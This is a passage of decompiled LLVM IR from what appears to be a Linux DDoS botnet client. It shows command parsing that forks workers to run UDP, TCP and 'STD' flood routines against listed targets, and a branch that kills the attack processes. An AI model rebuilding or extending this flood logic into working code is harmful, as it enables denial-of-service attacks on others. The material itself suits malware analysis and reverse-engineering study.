dec_label_pc_804c842:                             ; preds = %dec_label_pc_804c835
  %v9_804c879 = call i32 @sendUDP(i32 %v2_804c6ab, i32 %v1_804c6bb, i32 %v1_804c6ce, i32 %v1_804c6e1, i32 %v1_804c6f4, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c885 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c88a:                             ; preds = %dec_label_pc_804c57d
  %v2_804c88d = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c8aa = inttoptr i32 %v2_804c88d to i8*
  store i32 %v2_804c88d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056b5d.122 to i32), i32* @edi, align 4
  %v7_804c8bc = call i32 @_strncmp(i8* %v4_804c8aa, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056b5d.122, i32 0, i32 0), i32 4)
  %v8_804c8bc = urem i32 %v7_804c8bc, 2
  %v9_804c8bc = icmp eq i32 %v8_804c8bc, 0
  %v0_804c8be = load i1, i1* %cf.global-to-local, align 1
  %v2_804c8be = or i1 %v0_804c8be, %v9_804c8bc
  %v3_804c8be = zext i1 %v2_804c8be to i32
  %v4_804c8be = load i32, i32* %edx.global-to-local, align 4
  %v5_804c8be = and i32 %v4_804c8be, -256
  %v6_804c8be = or i32 %v3_804c8be, %v5_804c8be
  %v7_804c8be = xor i32 %v6_804c8be, 1
  store i32 %v7_804c8be, i32* @edx, align 4
  %v1_804c8c6 = trunc i32 %v7_804c8be to i8
  %v3_804c8c6 = zext i1 %v0_804c8be to i8
  %v15_804c8c6 = icmp eq i8 %v1_804c8c6, %v3_804c8c6
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c8cf = icmp eq i1 %v15_804c8c6, false
  br i1 %v1_804c8cf, label %dec_label_pc_804cb18, label %dec_label_pc_804c8d5

dec_label_pc_804c8d5:                             ; preds = %dec_label_pc_804c88a
  %v9_804c8d5 = icmp ult i32 %arg1, 5
  store i1 %v9_804c8d5, i1* %cf.global-to-local, align 1
  %v7_804c8d9 = icmp sgt i32 %arg1, 5
  br i1 %v7_804c8d9, label %dec_label_pc_804c8df, label %dec_label_pc_804c967

dec_label_pc_804c8df:                             ; preds = %dec_label_pc_804c8d5
  %v1_804c8e2 = add i32 %tmp119, 12
  %v5_804c8e2 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c8e2, i1* %cf.global-to-local, align 1
  %v1_804c8e5 = inttoptr i32 %v1_804c8e2 to i32*
  %v2_804c8e5 = load i32, i32* %v1_804c8e5, align 4
  %v1_804c8ea = call i32 @atol(i32 %v2_804c8e5)
  %v5_804c8ef = icmp ne i32 %v1_804c8ea, -1
  store i1 %v5_804c8ef, i1* %cf.global-to-local, align 1
  %v10_804c8ef = icmp eq i32 %v1_804c8ea, -1
  br i1 %v10_804c8ef, label %dec_label_pc_804c967, label %dec_label_pc_804c8f4

dec_label_pc_804c8f4:                             ; preds = %dec_label_pc_804c8df
  %v1_804c8f7 = add i32 %tmp119, 8
  %v5_804c8f7 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c8f7, i1* %cf.global-to-local, align 1
  %v1_804c8fa = inttoptr i32 %v1_804c8f7 to i32*
  %v2_804c8fa = load i32, i32* %v1_804c8fa, align 4
  %v1_804c8ff = call i32 @atol(i32 %v2_804c8fa)
  %v5_804c904 = icmp ne i32 %v1_804c8ff, -1
  store i1 %v5_804c904, i1* %cf.global-to-local, align 1
  %v10_804c904 = icmp eq i32 %v1_804c8ff, -1
  br i1 %v10_804c904, label %dec_label_pc_804c967, label %dec_label_pc_804c909

dec_label_pc_804c909:                             ; preds = %dec_label_pc_804c8f4
  %v1_804c90c = add i32 %tmp119, 16
  %v2_804c90c = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c90c, i1* %cf.global-to-local, align 1
  %v1_804c90f = inttoptr i32 %v1_804c90c to i32*
  %v2_804c90f = load i32, i32* %v1_804c90f, align 4
  %v1_804c914 = call i32 @atol(i32 %v2_804c90f)
  %v5_804c919 = icmp ne i32 %v1_804c914, -1
  store i1 %v5_804c919, i1* %cf.global-to-local, align 1
  %v10_804c919 = icmp eq i32 %v1_804c914, -1
  br i1 %v10_804c919, label %dec_label_pc_804c967, label %dec_label_pc_804c91e

dec_label_pc_804c91e:                             ; preds = %dec_label_pc_804c909
  store i1 %v2_804c90c, i1* %cf.global-to-local, align 1
  %v2_804c924 = load i32, i32* %v1_804c90f, align 4
  %v1_804c929 = call i32 @atol(i32 %v2_804c924)
  %v1_804c92e = add i32 %v1_804c929, -32
  %v2_804c92e = icmp ult i32 %v1_804c929, 32
  %v3_804c92e = sub i32 31, %v1_804c929
  %v4_804c92e = and i32 %v3_804c92e, %v1_804c929
  %v5_804c92e = icmp slt i32 %v4_804c92e, 0
  store i1 %v2_804c92e, i1* %cf.global-to-local, align 1
  %v6_804c92e = icmp eq i32 %v1_804c92e, 0
  %v7_804c92e = icmp slt i32 %v1_804c92e, 0
  %v3_804c931 = icmp eq i1 %v7_804c92e, %v5_804c92e
  %v4_804c931 = icmp eq i1 %v6_804c92e, false
  %v5_804c931 = and i1 %v4_804c931, %v3_804c931
  br i1 %v5_804c931, label %dec_label_pc_804c967, label %dec_label_pc_804c933

dec_label_pc_804c933:                             ; preds = %dec_label_pc_804c91e
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c937 = icmp sgt i32 %arg1, 6
  br i1 %v7_804c937, label %dec_label_pc_804c939, label %dec_label_pc_804c94d

dec_label_pc_804c939:                             ; preds = %dec_label_pc_804c933
  %v1_804c93c = add i32 %tmp119, 24
  %v5_804c93c = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c93c, i1* %cf.global-to-local, align 1
  %v1_804c93f = inttoptr i32 %v1_804c93c to i32*
  %v2_804c93f = load i32, i32* %v1_804c93f, align 4
  %v1_804c944 = call i32 @atol(i32 %v2_804c93f)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c949 = icmp slt i32 %v1_804c944, 0
  br i1 %v2_804c949, label %dec_label_pc_804c967, label %dec_label_pc_804c94d

dec_label_pc_804c94d:                             ; preds = %dec_label_pc_804c933, %dec_label_pc_804c939
  %v8_804c94d = icmp ult i32 %arg1, 8
  store i1 %v8_804c94d, i1* %cf.global-to-local, align 1
  %v12_804c94d = icmp eq i32 %arg1, 8
  %v1_804c951 = icmp eq i1 %v12_804c94d, false
  br i1 %v1_804c951, label %dec_label_pc_804c981, label %dec_label_pc_804c953

dec_label_pc_804c953:                             ; preds = %dec_label_pc_804c94d
  %v1_804c956 = add i32 %tmp119, 28
  %v5_804c956 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c956, i1* %cf.global-to-local, align 1
  %v1_804c959 = inttoptr i32 %v1_804c956 to i32*
  %v2_804c959 = load i32, i32* %v1_804c959, align 4
  %v1_804c95e = call i32 @atol(i32 %v2_804c959)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp131 = icmp slt i32 %v1_804c95e, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_804c981, label %dec_label_pc_804c967

dec_label_pc_804c967:                             ; preds = %dec_label_pc_804c8d5, %dec_label_pc_804c953, %dec_label_pc_804c939, %dec_label_pc_804c91e, %dec_label_pc_804c909, %dec_label_pc_804c8f4, %dec_label_pc_804c8df
  %v0_804c967 = load i32, i32* @global_var_805a080.18, align 128
  %v2_804c977 = call i32 @Rootsprintf(i32 %v0_804c967, i32 ptrtoint ([186 x i8]* @global_var_8056b64.123 to i32))
  br label %dec_label_pc_804cd9b

dec_label_pc_804c981:                             ; preds = %dec_label_pc_804c953, %dec_label_pc_804c94d
  %v1_804c984 = add i32 %tmp119, 4
  %v1_804c987 = inttoptr i32 %v1_804c984 to i32*
  %v2_804c987 = load i32, i32* %v1_804c987, align 4
  store i1 %v5_804c8f7, i1* %cf.global-to-local, align 1
  %v2_804c992 = load i32, i32* %v1_804c8fa, align 4
  %v1_804c997 = call i32 @atol(i32 %v2_804c992)
  store i1 %v5_804c8e2, i1* %cf.global-to-local, align 1
  %v2_804c9a5 = load i32, i32* %v1_804c8e5, align 4
  %v1_804c9aa = call i32 @atol(i32 %v2_804c9a5)
  store i1 %v2_804c90c, i1* %cf.global-to-local, align 1
  %v2_804c9b8 = load i32, i32* %v1_804c90f, align 4
  %v1_804c9bd = call i32 @atol(i32 %v2_804c9b8)
  %v1_804c9c8 = add i32 %tmp119, 20
  %v1_804c9cb = inttoptr i32 %v1_804c9c8 to i32*
  %v2_804c9cb = load i32, i32* %v1_804c9cb, align 4
  store i1 %v8_804c94d, i1* %cf.global-to-local, align 1
  br i1 %v1_804c951, label %dec_label_pc_804c9f8, label %dec_label_pc_804c9d6

dec_label_pc_804c9d6:                             ; preds = %dec_label_pc_804c981
  %v1_804c9d9 = add i32 %tmp119, 28
  %v5_804c9d9 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c9d9, i1* %cf.global-to-local, align 1
  %v1_804c9dc = inttoptr i32 %v1_804c9d9 to i32*
  %v2_804c9dc = load i32, i32* %v1_804c9dc, align 4
  %v1_804c9e1 = call i32 @atol(i32 %v2_804c9dc)
  br label %dec_label_pc_804c9f8

dec_label_pc_804c9f8:                             ; preds = %dec_label_pc_804c981, %dec_label_pc_804c9d6
  %storemerge5 = phi i32 [ %v1_804c9e1, %dec_label_pc_804c9d6 ], [ 10, %dec_label_pc_804c981 ]
  store i32 %storemerge5, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c937, label %dec_label_pc_804ca07, label %dec_label_pc_804ca29

dec_label_pc_804ca07:                             ; preds = %dec_label_pc_804c9f8
  %v1_804ca0a = add i32 %tmp119, 24
  %v5_804ca0a = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ca0a, i1* %cf.global-to-local, align 1
  %v1_804ca0d = inttoptr i32 %v1_804ca0a to i32*
  %v2_804ca0d = load i32, i32* %v1_804ca0d, align 4
  %v1_804ca12 = call i32 @atol(i32 %v2_804ca0d)
  br label %dec_label_pc_804ca29

dec_label_pc_804ca29:                             ; preds = %dec_label_pc_804c9f8, %dec_label_pc_804ca07
  %storemerge4 = phi i32 [ %v1_804ca12, %dec_label_pc_804ca07 ], [ 0, %dec_label_pc_804c9f8 ]
  store i32 %storemerge4, i32* @edi, align 4
  %v2_804ca40 = inttoptr i32 %v2_804c987 to i8*
  %v3_804ca40 = call i32 @__GI_strchr(i8* %v2_804ca40, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca45 = icmp eq i32 %v3_804ca40, 0
  br i1 %v1_804ca45, label %dec_label_pc_804cace, label %dec_label_pc_804ca4d

dec_label_pc_804ca4d:                             ; preds = %dec_label_pc_804ca29
  store i32 %v2_804c987, i32* @eax, align 4
  %v2_804ca5b = call i32 @__GI_strtok(i32 %v2_804c987, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cac625 = icmp eq i32 %v2_804ca5b, 0
  %v1_804caca32 = icmp eq i1 %v4_804cac625, false
  br i1 %v1_804caca32, label %dec_label_pc_804ca65, label %dec_label_pc_804cb18

dec_label_pc_804ca65:                             ; preds = %dec_label_pc_804ca4d, %dec_label_pc_804caaf
  %storemerge1033 = phi i32 [ %v2_804cabe, %dec_label_pc_804caaf ], [ %v2_804ca5b, %dec_label_pc_804ca4d ]
  %v0_804ca65 = call i32 @listFork()
  store i32 %v0_804ca65, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca6a = icmp eq i32 %v0_804ca65, 0
  %v1_804ca6c = icmp eq i1 %v1_804ca6a, false
  br i1 %v1_804ca6c, label %dec_label_pc_804caaf, label %dec_label_pc_804ca6e

dec_label_pc_804ca6e:                             ; preds = %dec_label_pc_804ca65
  %v7_804ca9e = inttoptr i32 %v2_804c9cb to i8*
  %v8_804ca9e = call i32 @sendTCP(i32 %storemerge1033, i32 %v1_804c997, i32 %v1_804c9aa, i32 %v1_804c9bd, i8* %v7_804ca9e, i32 %storemerge4, i32 %storemerge5)
  %v1_804caaa = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804caaf:                             ; preds = %dec_label_pc_804ca65
  %v2_804cabe = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cac6 = icmp eq i32 %v2_804cabe, 0
  %v1_804caca = icmp eq i1 %v4_804cac6, false
  br i1 %v1_804caca, label %dec_label_pc_804ca65, label %dec_label_pc_804cb18

dec_label_pc_804cace:                             ; preds = %dec_label_pc_804ca29
  %v0_804cace = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cad3 = icmp eq i32 %v0_804cace, 0
  %v1_804cad5 = icmp eq i1 %v1_804cad3, false
  br i1 %v1_804cad5, label %dec_label_pc_804cb18, label %dec_label_pc_804cad7

dec_label_pc_804cad7:                             ; preds = %dec_label_pc_804cace
  %v7_804cb07 = inttoptr i32 %v2_804c9cb to i8*
  %v8_804cb07 = call i32 @sendTCP(i32 %v2_804c987, i32 %v1_804c997, i32 %v1_804c9aa, i32 %v1_804c9bd, i8* %v7_804cb07, i32 %storemerge4, i32 %storemerge5)
  %v1_804cb13 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cb18:                             ; preds = %dec_label_pc_804caaf, %dec_label_pc_804ca4d, %dec_label_pc_804cace, %dec_label_pc_804c88a
  %v2_804cb1b = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804cb38 = inttoptr i32 %v2_804cb1b to i8*
  store i32 %v2_804cb1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056c1e.124 to i32), i32* @edi, align 4
  %v7_804cb4a = call i32 @_strncmp(i8* %v4_804cb38, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056c1e.124, i32 0, i32 0), i32 4)
  %v8_804cb4a = urem i32 %v7_804cb4a, 2
  %v9_804cb4a = icmp eq i32 %v8_804cb4a, 0
  %v0_804cb4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804cb4c = or i1 %v0_804cb4c, %v9_804cb4a
  %v3_804cb4c = zext i1 %v2_804cb4c to i32
  %v4_804cb4c = load i32, i32* @edx, align 4
  %v5_804cb4c = and i32 %v4_804cb4c, -256
  %v6_804cb4c = or i32 %v3_804cb4c, %v5_804cb4c
  %v7_804cb4c = xor i32 %v6_804cb4c, 1
  store i32 %v7_804cb4c, i32* @edx, align 4
  %v1_804cb54 = trunc i32 %v7_804cb4c to i8
  %v3_804cb54 = zext i1 %v0_804cb4c to i8
  %v15_804cb54 = icmp eq i8 %v1_804cb54, %v3_804cb54
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb5d = icmp eq i1 %v15_804cb54, false
  br i1 %v1_804cb5d, label %dec_label_pc_804cc8a, label %dec_label_pc_804cb63

dec_label_pc_804cb63:                             ; preds = %dec_label_pc_804cb18
  %v9_804cb63 = icmp ult i32 %arg1, 3
  store i1 %v9_804cb63, i1* %cf.global-to-local, align 1
  %v7_804cb67 = icmp sgt i32 %arg1, 3
  br i1 %v7_804cb67, label %dec_label_pc_804cb69, label %dec_label_pc_804cb91

dec_label_pc_804cb69:                             ; preds = %dec_label_pc_804cb63
  %v1_804cb6c = add i32 %tmp119, 8
  %v5_804cb6c = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804cb6c, i1* %cf.global-to-local, align 1
  %v1_804cb6f = inttoptr i32 %v1_804cb6c to i32*
  %v2_804cb6f = load i32, i32* %v1_804cb6f, align 4
  %v1_804cb74 = call i32 @atol(i32 %v2_804cb6f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp133 = icmp slt i32 %v1_804cb74, 1
  br i1 %tmp133, label %dec_label_pc_804cb91, label %dec_label_pc_804cb7d

dec_label_pc_804cb7d:                             ; preds = %dec_label_pc_804cb69
  %v1_804cb80 = add i32 %tmp119, 12
  %v5_804cb80 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cb80, i1* %cf.global-to-local, align 1
  %v1_804cb83 = inttoptr i32 %v1_804cb80 to i32*
  %v2_804cb83 = load i32, i32* %v1_804cb83, align 4
  %v1_804cb88 = call i32 @atol(i32 %v2_804cb83)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v1_804cb88, 1
  %tmp135 = icmp eq i1 %tmp134, false
  br i1 %tmp135, label %dec_label_pc_804cbab, label %dec_label_pc_804cb91

dec_label_pc_804cb91:                             ; preds = %dec_label_pc_804cb63, %dec_label_pc_804cb7d, %dec_label_pc_804cb69
  %v0_804cb91 = load i32, i32* @global_var_805a080.18, align 128
  %v2_804cba1 = call i32 @Rootsprintf(i32 %v0_804cb91, i32 ptrtoint ([27 x i8]* @global_var_8056c22.125 to i32))
  br label %dec_label_pc_804cd9b

dec_label_pc_804cbab:                             ; preds = %dec_label_pc_804cb7d
  %v1_804cbae = add i32 %tmp119, 4
  %v1_804cbb1 = inttoptr i32 %v1_804cbae to i32*
  %v2_804cbb1 = load i32, i32* %v1_804cbb1, align 4
  store i1 %v5_804cb6c, i1* %cf.global-to-local, align 1
  %v2_804cbbc = load i32, i32* %v1_804cb6f, align 4
  %v1_804cbc1 = call i32 @atol(i32 %v2_804cbbc)
  store i1 %v5_804cb80, i1* %cf.global-to-local, align 1
  %v2_804cbcf = load i32, i32* %v1_804cb83, align 4
  %v1_804cbd4 = call i32 @atol(i32 %v2_804cbcf)
  %v2_804cbea = inttoptr i32 %v2_804cbb1 to i8*
  %v3_804cbea = call i32 @__GI_strchr(i8* %v2_804cbea, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cbef = icmp eq i32 %v3_804cbea, 0
  br i1 %v1_804cbef, label %dec_label_pc_804cc58, label %dec_label_pc_804cbf3

dec_label_pc_804cbf3:                             ; preds = %dec_label_pc_804cbab
  store i32 %v2_804cbb1, i32* @eax, align 4
  %v2_804cc01 = call i32 @__GI_strtok(i32 %v2_804cbb1, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cc5016 = icmp eq i32 %v2_804cc01, 0
  %v1_804cc5423 = icmp eq i1 %v4_804cc5016, false
  br i1 %v1_804cc5423, label %dec_label_pc_804cc0b, label %dec_label_pc_804cc8a

dec_label_pc_804cc0b:                             ; preds = %dec_label_pc_804cbf3, %dec_label_pc_804cc39
  %storemerge1124 = phi i32 [ %v2_804cc48, %dec_label_pc_804cc39 ], [ %v2_804cc01, %dec_label_pc_804cbf3 ]
  %v0_804cc0b = call i32 @listFork()
  store i32 %v0_804cc0b, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc10 = icmp eq i32 %v0_804cc0b, 0
  %v1_804cc12 = icmp eq i1 %v1_804cc10, false
  br i1 %v1_804cc12, label %dec_label_pc_804cc39, label %dec_label_pc_804cc14

dec_label_pc_804cc14:                             ; preds = %dec_label_pc_804cc0b
  %v3_804cc28 = call i32 @sendSTD(i32 %storemerge1124, i32 %v1_804cbc1, i32 %v1_804cbd4)
  %v1_804cc34 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cc39:                             ; preds = %dec_label_pc_804cc0b
  %v2_804cc48 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cc50 = icmp eq i32 %v2_804cc48, 0
  %v1_804cc54 = icmp eq i1 %v4_804cc50, false
  br i1 %v1_804cc54, label %dec_label_pc_804cc0b, label %dec_label_pc_804cc8a

dec_label_pc_804cc58:                             ; preds = %dec_label_pc_804cbab
  %v0_804cc58 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc5d = icmp eq i32 %v0_804cc58, 0
  %v1_804cc5f = icmp eq i1 %v1_804cc5d, false
  br i1 %v1_804cc5f, label %dec_label_pc_804cd9b, label %dec_label_pc_804cc65

dec_label_pc_804cc65:                             ; preds = %dec_label_pc_804cc58
  %v3_804cc79 = call i32 @sendSTD(i32 %v2_804cbb1, i32 %v1_804cbc1, i32 %v1_804cbd4)
  %v1_804cc85 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cc8a:                             ; preds = %dec_label_pc_804cc39, %dec_label_pc_804cbf3, %dec_label_pc_804cb18
  %v2_804cc8d = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ccaa = inttoptr i32 %v2_804cc8d to i8*
  %v7_804ccbc = call i32 @_strncmp(i8* %v4_804ccaa, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056c3d.126, i32 0, i32 0), i32 5)
  %v8_804ccbc = urem i32 %v7_804ccbc, 2
  %v9_804ccbc = icmp eq i32 %v8_804ccbc, 0
  %v0_804ccbe = load i1, i1* %cf.global-to-local, align 1
  %v2_804ccbe = or i1 %v0_804ccbe, %v9_804ccbc
  %v3_804ccbe = zext i1 %v2_804ccbe to i32
  %v4_804ccbe = load i32, i32* @edx, align 4
  %v5_804ccbe = and i32 %v4_804ccbe, -256
  %v6_804ccbe = or i32 %v3_804ccbe, %v5_804ccbe
  %v7_804ccbe = xor i32 %v6_804ccbe, 1
  store i32 %v7_804ccbe, i32* %edx.global-to-local, align 4
  %v1_804ccc6 = trunc i32 %v7_804ccbe to i8
  %v3_804ccc6 = zext i1 %v0_804ccbe to i8
  %v4_804ccc6 = sub nsw i8 %v1_804ccc6, %v3_804ccc6
  %v15_804ccc6 = icmp eq i8 %v4_804ccc6, 0
  %v2_804ccca = sext i8 %v4_804ccc6 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cccf = icmp eq i1 %v15_804ccc6, false
  br i1 %v1_804cccf, label %dec_label_pc_804cd9b, label %dec_label_pc_804cd3e

dec_label_pc_804cce5:                             ; preds = %dec_label_pc_804cd7b, %dec_label_pc_804cd3e
  %v2_804cce8 = mul i32 %storemerge1, 4
  %v9_804cce8 = and i32 %storemerge1, 1073741824
  %v10_804cce8 = icmp ne i32 %v9_804cce8, 0
  store i32 %v2_804cce8, i32* %edx.global-to-local, align 4
  %v0_804cced = load i32, i32* @global_var_8060314.34, align 4
  %v2_804ccf2 = add i32 %v0_804cced, %v2_804cce8
  %v1_804ccf5 = inttoptr i32 %v2_804ccf2 to i32*
  %v2_804ccf5 = load i32, i32* %v1_804ccf5, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ccf7 = icmp eq i32 %v2_804ccf5, 0
  br i1 %v1_804ccf7, label %dec_label_pc_804cd3b, label %dec_label_pc_804ccfb

dec_label_pc_804ccfb:                             ; preds = %dec_label_pc_804cce5
  store i1 %v10_804cce8, i1* %cf.global-to-local, align 1
  store i32 %v2_804cce8, i32* %edx.global-to-local, align 4
  %v2_804cd0b = load i32, i32* %v1_804ccf5, align 4
  store i32 %v2_804cd0b, i32* @ebx, align 4
  %v0_804cd0d = call i32 @__libc_getpid()
  %v0_804cd12 = load i32, i32* @ebx, align 4
  %v7_804cd12 = icmp ult i32 %v0_804cd12, %v0_804cd0d
  store i1 %v7_804cd12, i1* %cf.global-to-local, align 1
  %v12_804cd12 = icmp eq i32 %v0_804cd12, %v0_804cd0d
  br i1 %v12_804cd12, label %dec_label_pc_804cd3b, label %dec_label_pc_804cd16

dec_label_pc_804cd16:                             ; preds = %dec_label_pc_804ccfb
  store i1 %v10_804cce8, i1* %cf.global-to-local, align 1
  store i32 %v2_804cce8, i32* %edx.global-to-local, align 4
  %v0_804cd1e = load i32, i32* @global_var_8060314.34, align 4
  %v2_804cd23 = add i32 %v0_804cd1e, %v2_804cce8
  %v1_804cd26 = inttoptr i32 %v2_804cd23 to i32*
  %v2_804cd26 = load i32, i32* %v1_804cd26, align 4
  %v2_804cd33 = call i32 @kill(i32 %v2_804cd26, i32 9)
  %v4_804cd38 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804cd3b

dec_label_pc_804cd3b:                             ; preds = %dec_label_pc_804ccfb, %dec_label_pc_804cce5, %dec_label_pc_804cd16
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804cce5 ], [ %stack_var_-28.1, %dec_label_pc_804ccfb ], [ %v4_804cd38, %dec_label_pc_804cd16 ]
  %v4_804cd3b = add i32 %storemerge1, 1
  br label %dec_label_pc_804cd3e

dec_label_pc_804cd3e:                             ; preds = %dec_label_pc_804cc8a, %dec_label_pc_804cd3b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804cd3b ], [ 0, %dec_label_pc_804cc8a ]
  %storemerge1 = phi i32 [ %v4_804cd3b, %dec_label_pc_804cd3b ], [ 0, %dec_label_pc_804cc8a ]
  %v0_804cd52 = load i32, i32* @global_var_805a088.32, align 8
  %v0_804cd57 = load i32, i32* @global_var_805a08c.33, align 4
  store i32 %v0_804cd57, i32* %edx.global-to-local, align 4
  %v10_804cd6f = icmp ne i32 %v0_804cd57, 0
  store i1 %v10_804cd6f, i1* %cf.global-to-local, align 1
  br i1 %v10_804cd6f, label %dec_label_pc_804cce5, label %dec_label_pc_804cd7b

dec_label_pc_804cd7b:                             ; preds = %dec_label_pc_804cd3e
  %v10_804cd8f = icmp ult i32 %storemerge1, %v0_804cd52
  store i1 %v10_804cd8f, i1* %cf.global-to-local, align 1
  br i1 %v10_804cd8f, label %dec_label_pc_804cce5, label %dec_label_pc_804cd9b

dec_label_pc_804cd9b:                             ; preds = %dec_label_pc_804c813, %dec_label_pc_804cd7b, %dec_label_pc_804c7aa, %dec_label_pc_804c480, %dec_label_pc_804c45e, %dec_label_pc_804cc8a, %dec_label_pc_804cc58, %dec_label_pc_804c835, %dec_label_pc_804c499, %dec_label_pc_804c468, %dec_label_pc_804c3b5, %dec_label_pc_804c32a, %dec_label_pc_804cb91, %dec_label_pc_804c967, %dec_label_pc_804c68b, %dec_label_pc_804c3de, %dec_label_pc_804c27b
  %v0_804cda5 = phi i32 [ %v1_804c48b, %dec_label_pc_804c480 ], [ %v2_804c453, %dec_label_pc_804c45e ], [ %v2_804ccca, %dec_label_pc_804cc8a ], [ %v0_804cc58, %dec_label_pc_804cc58 ], [ %v0_804c835, %dec_label_pc_804c835 ], [ %v0_804c499, %dec_label_pc_804c499 ], [ %v1_804c473, %dec_label_pc_804c468 ], [ %v0_804c3b5, %dec_label_pc_804c3b5 ], [ 0, %dec_label_pc_804c32a ], [ %v2_804cba1, %dec_label_pc_804cb91 ], [ %v2_804c977, %dec_label_pc_804c967 ], [ %v2_804c69b, %dec_label_pc_804c68b ], [ %v1_804c3c2, %dec_label_pc_804c3de ], [ %v2_804c28b, %dec_label_pc_804c27b ], [ %v2_804c7b8, %dec_label_pc_804c7aa ], [ %v0_804cd52, %dec_label_pc_804cd7b ], [ %v2_804c822, %dec_label_pc_804c813 ]
  %v0_804cd9b = load i32, i32* @esp, align 4
  %v5_804cd9b = icmp ugt i32 %v0_804cd9b, -301
  store i1 %v5_804cd9b, i1* %cf.global-to-local, align 1
  %v2_804cda1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cda1, i32* @ebx, align 4
  store i32 %v0_804c22c, i32* @esi, align 4
  store i32 %v0_804c22b, i32* @edi, align 4
  ret i32 %v0_804cda5

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804cce8, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804ccbe, { 1, 0 }
  uselistorder i32 %v2_804cc48, { 1, 0 }
  uselistorder i32 %v1_804cbd4, { 1, 0 }
  uselistorder i32 %v1_804cbc1, { 1, 0 }
  uselistorder i32 %v2_804cbb1, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804cb4c, { 1, 0 }
  uselistorder i32 %v2_804cabe, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0, 2 }
  uselistorder i32 %storemerge5, { 1, 0, 2 }
  uselistorder i32 %v2_804c9cb, { 1, 0 }
  uselistorder i32 %v1_804c9bd, { 1, 0 }
  uselistorder i32 %v1_804c9aa, { 1, 0 }
  uselistorder i32 %v1_804c997, { 1, 0 }
  uselistorder i32 %v2_804c987, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c92e, { 1, 0 }
  uselistorder i32 %v1_804c929, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804c8be, { 1, 0 }
  uselistorder i32 %v2_804c822, { 0, 2, 1 }
  uselistorder i32 %v2_804c7b8, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 1, 0, 2 }
  uselistorder i32 %storemerge8137, { 1, 0 }
  uselistorder i32 %v1_804c70d, { 2, 1, 0 }
  uselistorder i32 %v1_804c6f4, { 1, 0 }
  uselistorder i32 %v1_804c6e1, { 1, 0 }
  uselistorder i32 %v1_804c6ce, { 1, 0 }
  uselistorder i32 %v1_804c6bb, { 1, 0 }
  uselistorder i32 %v2_804c6ab, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804c671, { 1, 0, 2 }
  uselistorder i32 %v1_804c66c, { 1, 0 }
  uselistorder i32 %v1_804c667, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c655, { 1, 0 }
